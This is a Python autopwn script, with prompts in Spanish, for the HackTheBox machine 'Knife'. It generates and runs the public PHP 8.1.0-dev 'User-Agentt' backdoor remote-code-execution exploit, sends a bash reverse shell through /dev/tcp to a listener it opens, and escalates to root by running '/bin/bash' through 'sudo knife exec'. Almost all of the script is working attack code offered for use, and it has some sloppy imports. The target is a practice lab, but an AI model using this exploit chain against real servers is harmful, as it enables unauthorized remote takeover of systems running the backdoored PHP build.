
import requests
import sys
import threading

print('''   _                            _                 _      _ _  _   ''')
time.sleep(0.1)
print('''  (_) __ _  __ _  __ _  ___  __| |_ __ ___  _   _| | ___/ | || |  ''')
time.sleep(0.1)
print('''  | |/ _` |/ _` |/ _` |/ _ \/ _` | '_ ` _ \| | | | |/ _ \ | || |_ ''')
time.sleep(0.1)
print('''  | | (_| | (_| | (_| |  __/ (_| | | | | | | |_| | |  __/ |__   _|''')
time.sleep(0.1)
print(''' _/ |\__,_|\__, |\__, |\___|\__,_|_| |_| |_|\__,_|_|\___|_|  |_|  ''')
time.sleep(0.1)
print('''|__/       |___/ |___/                                            ''')
time.sleep(0.1)

print('JAGGEDMULE14 - KNIFE HACKTHEBOX AUTOPWN\n')

p = print
ip = input('Introduce tu ip (tun0): ')
port = int(input('Puerto con el que quieras romper la mamona\n\n[!]IMPORTANTE\nSi el puerto que quieres está por debajo del 1024 requeriras ejecutar este script como root\nrecomiendo un puerto superior al 1024\n\nIntroduce tu puerto: '))

def def_handler(sig, frame):
    p('[-]Exit')
    sys.exit(1)

from pwn import *

signal.signal(signal.SIGINT, def_handler)

def ping(host):
    response = os.system(f'ping -c 1 {host} >/dev/null 2>&1')

    if response == 0:
        return True
    else:
        return False

if ping('10.10.10.242') == False:
    p('[-]Conexión con la máquina fallida')
    time.sleep(0.5)
    p('[-]La máquina está activa?')
    time.sleep(0.5)
    p('[-]Intenta ejecutar el script de nuevo')
    sys.exit(1)

else:
    p('\n[+]Conexión exitosa')
    r = requests.get('http://10.10.10.242')
    if r.status_code == 200:
        time.sleep(0.5)
        p(f'[+]HTTP/{r.status_code}OK')
        time.sleep(0.5)
        p('[+]Ejecutando exploit, espera...')
        
        os.system('mkdir Knife; touch ./Knife/exploit.py')
        f = open('./Knife/exploit.py','w')
        f.write('''

# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
# Date: 23 may 2021
# Exploit Author: flast101
# Vendor Homepage: https://www.php.net/
# Software Link:
#     - https://hub.docker.com/r/phpdaily/php
#    - https://github.com/phpdaily/php
# Version: 8.1.0-dev
# Tested on: Ubuntu 20.04
# References:
#    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
#   - https://github.com/vulhub/vulhub/blob/master/php/8.1-backdoor/README.zh-cn.md

"""
Blog: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/
Download: https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py
Contact: flast101.sec@gmail.com

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.
"""

#!/usr/bin/env python3
import os
import re
import requests

host = "http://10.10.10.242"
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("Interactive shell is opened on", host, "Can't acces tty; job crontol turned off.")
    x = 1
    try:
        while x == 1:
            x +=1 ''')
        f.write(f"""\n            cmd = 'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'""")
        f.write('''\n            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("a")
    print(response)
    print("Host is not available, aborting...")
    exit ''')
        
        f.close()
        
        def shell():
            os.system('python3 ./Knife/exploit.py')
        
        try:
            threading.Thread(target=shell).start()

        except Exception as e:
            p(f'[-]{e}')

        shellc = listen(port, timeout=20).wait_for_connection()
        
        if shellc.sock is None:
            p("[-]Conexión fallida")
            sys.exit(1)
        else:
            p("[+]Conectado como james")
            time.sleep(1)
            p('[+]Escalando privilegios...')
            shellc.sendline('''sudo /usr/bin/knife exec -E "system('/bin/bash')"''')
            p('\n[+]Conectado como ROOT exitosamente\n[!]Ctrl + C para salir')

        shellc.interactive()

    else:
        p('Algo salió mal')
        p(f'[-]HTTP/{r.status_code}')
        sys.exit(1)
